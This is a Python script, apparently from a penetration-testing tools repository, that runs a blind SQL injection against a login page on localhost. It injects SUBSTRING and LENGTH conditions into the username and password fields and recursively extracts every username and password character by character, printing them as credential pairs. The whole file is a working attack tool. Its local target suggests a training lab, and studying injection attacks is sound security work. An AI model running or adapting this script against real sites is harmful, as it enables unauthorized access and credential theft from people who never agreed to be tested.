#Mohammad Saidur Rahman
#Saidur.Rahman@mail.rit.edu
#https://github.com/msrocean/PenTestTools

import requests
from bs4 import BeautifulSoup as bs

url = 'http://localhost/login2.php'
alphabet = "abcdefghijklmnopqrstuvwxyz1234567890"
maxLength = 8
usernames = []
passwords = []

def main():
	iterateUsers('')

def iteratePasswords(userName, string):
	password = ''
	if(len(string) > maxLength):
		return "NO PASSWORD FOUND"
	for char in alphabet:
		newString = string + char
		tryPassword = '\' or substring(password,1,' + str(len(newString)) + ') = "' + newString + '" and userName="' + userName + '" -- '
		checkPassword = '\' or (substring(password,1,' + str(len(newString)) + ') = "' + newString + '" and length(password) = ' + str(len(newString)) + ' -- "'
		if(query(userName, tryPassword) == "valid"):
			password = iteratePasswords(userName, newString)
			if(len(password) > len(newString)):
				return password
			else:
				return newString
	return password

def iterateUsers(string):
	if(len(string) > maxLength):
		return
	if(checkUserName(string)):
		usernames.append(string)
		print(string + ":" + iteratePasswords(string,''))
	for char in alphabet:
		newString = string + char
		if(tryUserPrefix(newString) == "valid"):
			iterateUsers(newString)
	
def checkUserName(string):
	tryLen = '\'or (length(userName) = ' + str(len(string)) + ' and substring(userName,1,' + str(len(string)) + ') = "' + string + '") -- "'
	if(query(tryLen, '') == "valid"):
		return True
	else:
		return False
	
def tryUserPrefix(prefix):
	length = len(prefix)
	username = '\'or substring(userName,1,' + str(length) + ') = "' + prefix + '" -- "'
	return query(username, '')


def query(username, password):
	payload = {
		'userName':username,
		'password':password
	}

	session = requests.session()
	resp = session.post(url, data=payload)
	text = resp.text
	if(text.find(">Invalid SELECT") != -1):
		return "invalid"
	elif(text.find(">Valid SELECT") != -1):
		return "valid"
	else:
		return "error"

if __name__ == '__main__':
	main()
